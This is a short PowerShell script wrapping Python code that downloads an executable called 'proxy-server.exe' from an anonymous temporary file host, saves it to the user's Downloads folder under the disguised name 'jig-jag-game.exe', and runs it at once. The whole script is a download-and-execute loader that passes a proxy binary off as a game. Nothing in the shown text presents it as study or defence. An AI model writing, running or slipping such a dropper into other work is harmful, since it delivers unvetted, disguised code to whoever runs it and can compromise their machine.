# Check if Python is installed before running
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Python is not installed or not in your PATH." -ForegroundColor Red
    exit
}

# The hardcoded Python code
$pythonCode = @"
import os
import urllib.request
import subprocess
import sys

# Configuration
url = "https://temp.sh/YvdvP/proxy-server.exe"  # REPLACE WITH ACTUAL URL
filename = "jig-jag-game.exe"
downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
destination = os.path.join(downloads_path, filename)

try:
    # Download the file
    urllib.request.urlretrieve(url, destination)
    
    # Run the file
    # Use Popen to start it and immediately get the PID
    process = subprocess.Popen([destination], shell=True)
    
    # Output the message you requested
    print(f"{filename} is installed with process ID: {process.pid}")

except Exception as e:
    print(f"Python Error: {e}")
"@

# Execute the Python code directly
$pythonCode | python -
